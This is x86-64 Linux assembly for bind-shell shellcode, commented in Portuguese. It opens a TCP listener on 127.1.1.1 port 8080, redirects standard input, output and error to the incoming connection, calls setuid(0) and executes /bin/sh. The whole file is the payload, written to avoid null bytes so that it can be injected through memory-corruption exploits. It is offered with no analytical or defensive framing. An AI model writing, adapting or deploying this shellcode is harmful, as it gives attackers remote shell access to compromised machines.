[SECTION .text]

	global _start

_start:

	; fork()

	push 57
	pop rax
	syscall

	test rax, rax ; compara o rax

	jmp short socket
	nop

	socket:

	; cria o socket
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	push 6
	pop rdx
	syscall

	; auto save socket fd

	push rax
	pop rbp

	;sys_setsockopt	int fd(3)	int level(3)	int optname(2)	char *optval	int optlen

	push rbp
	pop rdi ; fd
	push rsp
	pop r10 ; char*optval
	push 4 ; optlen
	pop r8
	push 2 ; optname
	pop rdx
	push 54
	pop rax
	syscall

	; bind

	xor rax, rax
	push rax                         ; (bzero)
	mov dword [rsp-4], 0x0101017f 	 ; 0x7f010101 127.1.1.1 (ip)
	mov word [rsp-6], 0x901f         ; 0x1f90 = 8080 (porta)
	mov word [rsp-8], ax             ; elimina null byte
	add byte [rsp-8], 0x2            ; 0x0002 (protocolo af_inet)
	sub rsp, 8                       ; rsp no começo da função

	xor rax, rax
	mov rdx, rax
	mov rsi, rsp                     ; sockaddr *addr
	push rbp ; fd do socket
	pop rdi
	push 49
	pop rax
	push 16
	pop rdx
	syscall

	;listen

	push rbp
	pop rdi
	push 50
	pop rax
	xor rsi, rsi
	syscall

	; accept

	push 43
	pop rax
	push rbp
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	syscall

	push rax
	pop rbp

	;dup2(4, 0)

	push rbp
	pop rdi
    xor rsi, rsi
	push 33
	pop rax
	syscall

	; dup2(4, 1)

	push rbp
	pop rdi
	push 1
	pop rsi
	push 33
	pop rax
	syscall

	; dup2(4, 2)

	 push rbp
	 pop rdi
	 push 2
	 pop rsi
	 push 33
	 pop rax
	 syscall

	 jmp short shell
	 nop

	 shell:

	 push 105
	 pop rax
	 xor rdi, rdi
	 syscall

	 mov rdi, 0x68732f6e69622f6a
	 shr rdi, 8
	 push rdi
	 push rsp
	 pop rdi
 	 push 59
 	 pop rax
 	 xor rsi, rsi
 	 xor rdx, rdx
 	 syscall
